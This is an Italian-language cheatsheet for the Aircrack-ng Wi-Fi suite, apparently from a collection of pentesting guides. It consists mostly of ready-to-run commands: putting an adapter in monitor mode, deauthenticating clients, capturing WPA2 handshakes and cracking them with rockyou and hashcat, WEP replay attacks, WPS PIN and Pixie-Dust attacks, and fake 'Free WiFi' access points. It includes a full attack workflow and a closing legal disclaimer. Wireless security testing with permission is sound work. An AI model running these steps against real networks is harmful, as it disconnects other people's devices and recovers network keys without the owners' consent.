# 📶 Aircrack-ng - WiFi Hacking Suite Cheatsheet

```
    █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
   ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
   ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
   ██║  ██║██║██║  ██║╚██████╗██║  ██╗██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    WiFi Hacking Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

## 📋 Tabella dei Contenuti

* [Cos'è Aircrack-ng](#-cosè-aircrack-ng)
* [Installazione](#-installazione)
* [Monitor Mode](#-monitor-mode)
* [Reconnaissance (airodump-ng)](#-reconnaissance-airodump-ng)
* [Deauthentication (aireplay-ng)](#-deauthentication-aireplay-ng)
* [Cracking WPA/WPA2](#-cracking-wpawpa2)
* [Cracking WEP](#-cracking-wep)
* [Attacchi WPS](#-attacchi-wps)
* [Strumenti Aggiuntivi](#-strumenti-aggiuntivi)
* [Workflow Completo di Attacco](#-workflow-completo-di-attacco)
* [Riferimento Rapido](#-riferimento-rapido)

---

## 🎯 Cos'è Aircrack-ng

**Aircrack-ng** è una suite completa per la valutazione della sicurezza delle reti WiFi. Include:

* 📡 **airodump-ng** - Cattura pacchetti e rilevamento reti
* 💥 **aireplay-ng** - Iniezione di pacchetti e attacchi deauth
* 🔓 **aircrack-ng** - Cracker per chiavi WEP e WPA/WPA2
* 🔧 **airmon-ng** - Abilita/disabilita la monitor mode
* 📝 **airodecap-ng** - Decifra il traffico catturato

### Requisiti

| Requisito | Descrizione |
| --- | --- |
| **Adattatore Wireless** | Deve supportare monitor mode e packet injection |
| **Chipset Supportati** | Atheros, Ralink, Realtek (alcuni) |
| **Sistema Operativo** | Linux raccomandato (Kali) |

### Adattatori Compatibili Popolari

| Adattatore | Chipset | Note |
| --- | --- | --- |
| Alfa AWUS036ACH | RTL8812AU | Dual-band, potente |
| Alfa AWUS036NHA | Atheros AR9271 | Classico, affidabile |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Opzione economica |

---

## 🚀 Installazione

### Kali Linux (Pre-installato)

```bash
# Già installato, verifica la versione
aircrack-ng --version

# Aggiorna
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Da Sorgente

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Monitor Mode

### Controlla l'Interfaccia Wireless

```bash
# Elenca le interfacce wireless
iwconfig

# Oppure
iw dev

# Oppure
airmon-ng
```

### Abilita Monitor Mode

```bash
# Metodo 1: airmon-ng (raccomandato)
sudo airmon-ng start wlan0

# Output: Monitor mode enabled on wlan0mon

# Metodo 2: Manuale
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Kill dei Processi Interferenti

```bash
# Termina i processi che potrebbero interferire
sudo airmon-ng check kill

# Oppure manualmente
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Disabilita Monitor Mode

```bash
# Ferma la monitor mode
sudo airmon-ng stop wlan0mon

# Riavvia NetworkManager
sudo systemctl start NetworkManager
```

### Cambia Canale

```bash
# Imposta un canale specifico
sudo iwconfig wlan0mon channel 6

# Oppure con airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Reconnaissance (airodump-ng)

### Scansione di Base

```bash
# Scansiona tutte le reti
sudo airodump-ng wlan0mon

# Output:
# BSSID               PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2   PSK   TargetNetwork
```

### Scansione di una Banda Specifica

```bash
# Solo 2.4GHz
sudo airodump-ng --band g wlan0mon

# Solo 5GHz
sudo airodump-ng --band a wlan0mon

# Entrambe le bande
sudo airodump-ng --band abg wlan0mon
```

### Prendere di mira una Rete Specifica

```bash
# Filtra per canale e BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Scrivi la cattura su file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crea: capture-01.cap, capture-01.csv, ecc.
```

### Comprendere l'Output

```
BSSID               PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150       45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID               STATION            PWR   Rate    Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0     125    

```

| Campo | Descrizione |
| --- | --- |
| BSSID | Indirizzo MAC dell'Access Point |
| PWR | Forza del segnale (più vicino a 0 = più forte) |
| Beacons | Numero di beacon frame inviati |
| #Data | Numero di pacchetti dati |
| CH | Canale |
| ENC | Cifratura (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Nome della rete |
| STATION | Indirizzo MAC del client connesso |

### Opzioni di Filtraggio

```bash
# Mostra solo reti criptate con wpa2
sudo airodump-ng --encrypt wpa2 wlan0mon

# Mostra solo WEP
sudo airodump-ng --encrypt wep wlan0mon

# ESSID specifico
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Deauthentication (aireplay-ng)

### Perché la Deauthentication?

La deautenticazione forza i client a riconnettersi, permettendoci di catturare il "4-way handshake" necessario per il cracking WPA/WPA2.

### Deautenticare un Singolo Client

```bash
# Deautentica un client specifico
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Attacco deauthentication
# 5  : Numero di deauth (0 = infiniti)
# -a : BSSID dell'AP
# -c : MAC del Client
```

### Deautenticare Tutti i Client

```bash
# Deautenticazione broadcast (tutti i client)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Più aggressivo
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Controllare l'Handshake

```
# In airodump-ng, cerca:
WPA handshake: AA:BB:CC:DD:EE:FF

# Appare nell'angolo in alto a destra
```

---

## 🔓 Cracking WPA/WPA2

### Workflow Completo di Attacco WPA2

```bash
# Step 1: Abilita monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Scansiona le reti
sudo airodump-ng wlan0mon

# Step 3: Prendi di mira una rete specifica (cattura)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Deautentica client (nuovo terminale)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 5: Attendi l'handshake (appare in airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Step 6: Crack con wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Attacco a Dizionario

```bash
# Attacco a dizionario base
aircrack-ng -w wordlist.txt capture-01.cap

# Usa rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Wordlist multiple
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Specificare l'ESSID Target

```bash
# Se ci sono più reti nella cattura
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# O tramite BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Utilizzo di Hashcat (Più veloce con GPU)

```bash
# Converti cap in formato hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Crea: hashcat_file.hccapx

# O usa cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Crack con Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 per il vecchio formato hccap
```

### Conversione Formati

```bash
# Da CAP a HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# Da CAP a PCAP
editcap capture-01.cap output.pcap

# Unire più file cap
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 Cracking WEP

> ⚠️ WEP è obsoleto e insicuro. La maggior parte delle reti ora usa WPA2/WPA3.

### Tipi di Attacco WEP

| Attacco | Descrizione |
| --- | --- |
| ARP Replay | Cattura e reinvia pacchetti ARP |
| Fake Auth | Associazione con l'AP senza chiave |
| Fragmentation | Genera un keystream |
| ChopChop | Decifra pacchetti senza chiave |

### Attacco WEP Base

```bash
# Step 1: Cattura il traffico
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Step 2: Autenticazione falsata (Fake auth)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <tuo_mac> wlan0mon

# Step 3: Attacco ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <tuo_mac> wlan0mon

# Step 4: Cracking quando ci sono abbastanza IV (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Modalità di Attacco aireplay-ng

| Modalità | Descrizione |
| --- | --- |
| `-0` | Deauthentication |
| `-1` | Fake authentication |
| `-2` | Interactive packet replay |
| `-3` | ARP request repetition |
| `-4` | KoreK chopchop attack |
| `-5` | Fragmentation attack |
| `-9` | Test di iniezione |

---

## 🔓 Attacchi WPS

### Utilizzo di Reaver

```bash
# Installa Reaver
sudo apt install reaver

# Attacco WPS base
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Con canale specifico
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Attacco Pixie-Dust (molto veloce)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Utilizzo di Bully

```bash
# Installa Bully
sudo apt install bully

# Attacco base
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (Trova AP con WPS abilitato)

```bash
# Scansiona reti WPS
sudo wash -i wlan0mon

# L'output mostra:
# BSSID               Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Strumenti Aggiuntivi

### airbase-ng (Fake AP)

```bash
# Crea un AP falso
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Con BSSID specifico
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (Decifra Catture)

```bash
# Decifra cattura WPA con chiave nota
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Decifra cattura WEP
airdecap-ng -w <wep_key> capture-01.cap
```

### Opzioni aircrack-ng

```bash
# Mostra tutte le opzioni
aircrack-ng --help

# Usa più core della CPU
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Modalità silenziosa
aircrack-ng -q -w wordlist.txt capture-01.cap

# Specifica ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (Crea Pacchetti)

```bash
# Crea pacchetto ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Workflow Completo di Attacco

### Attacco WPA2 (Passo dopo Passo)

```bash
# Terminale 1: Preparazione
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verifica monitor mode
iwconfig  # Dovrebbe mostrare wlan0mon

# Terminale 1: Scansione reti
sudo airodump-ng wlan0mon
# Nota: BSSID, CH, ESSID del target

# Terminale 1: Target e cattura
sudo airodump-ng -c <CANALE> --bssid <BSSID_TARGET> -w handshake wlan0mon

# Terminale 2: Attacco deauthentication
sudo aireplay-ng -0 5 -a <BSSID_TARGET> -c <MAC_CLIENT> wlan0mon

# Attendi "WPA handshake: XX:XX:XX:XX:XX:XX" nel Terminale 1
# Premi Ctrl+C per fermare la cattura

# Terminale 1: Cracking dell'handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# O con Hashcat (GPU - più veloce)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Pulizia Post-Attacco

```bash
# Ferma monitor mode
sudo airmon-ng stop wlan0mon

# Riavvia NetworkManager
sudo systemctl start NetworkManager

# Pulisci i file (opzionale)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Riferimento Rapido

### Comandi Essenziali

| Scopo | Comando |
| --- | --- |
| Avvia monitor mode | `airmon-ng start wlan0` |
| Ferma monitor mode | `airmon-ng stop wlan0mon` |
| Uccidi processi che interferiscono | `airmon-ng check kill` |
| Scansione reti | `airodump-ng wlan0mon` |
| Prendi di mira una rete specifica | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Deauthentication | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Crack WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Riepilogo Attacchi

| Attacco | Cifratura | Metodo |
| --- | --- | --- |
| Dizionario | WPA/WPA2 | Cattura handshake → Crack con wordlist |
| Reaver | WPS | Brute force PIN WPS |
| Pixie-Dust | WPS | Attacco WPS offline |
| ARP Replay | WEP | Raccogli IVs → Crack della chiave |

### Wordlist Utili

| Percorso | Descrizione |
| --- | --- |
| `/usr/share/wordlists/rockyou.txt` | La più comune (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Controllo veloce |
| `/usr/share/seclists/Passwords/` | Collezione SecLists |

### Troubleshooting

```bash
# L'interfaccia non va in monitor mode
sudo rfkill unblock wifi
sudo rfkill unblock all

# Controlla se il driver supporta l'iniezione
sudo aireplay-ng -9 wlan0mon

# Handshake non catturato
# - Avvicinati al target
# - Prova diversi client
# - Deautentica in modo più aggressivo
# - Aspetta più a lungo

# Airmon dice "Found X processes"
sudo airmon-ng check kill
```

---

## ⚠️ Disclaimer Legale

```
⚠️ ATTENZIONE: Usa questi strumenti esclusivamente su reti di tua
PROPRIETÀ o su cui hai un PERMESSO SCRITTO ESPLICITO. L'accesso non
autorizzato a reti informatiche è ILLEGALE nella maggior parte delle giurisdizioni.

Usa responsabilmente per:
✅ Security auditing
✅ Penetration testing (con permesso)
✅ Scopi didattici (ambiente di laboratorio)

Non usare mai per:
❌ Accesso non autorizzato a reti
❌ Furto di credenziali
❌ Qualsiasi scopo malevolo
```

---

## 📚 Risorse

* [Sito Ufficiale Aircrack-ng](https://www.aircrack-ng.org/)
* [Wiki Aircrack-ng](https://www.aircrack-ng.org/doku.php)
* [Wiki Hashcat WiFi](https://hashcat.net/wiki/)

### Cheatsheets Collegate

- [Hashcat](../Hashcat/translations/README.it.md)
- [Wireshark](../Wireshark/translations/README.it.md)
- [Linux Commands](../Linux-Commands/translations/README.it.md)

---

<p align="center">
  <b>📶 Master WiFi Security Testing!</b>
  <i>Aircrack-ng - Il miglior amico dei WiFi pentester</i>
</p>
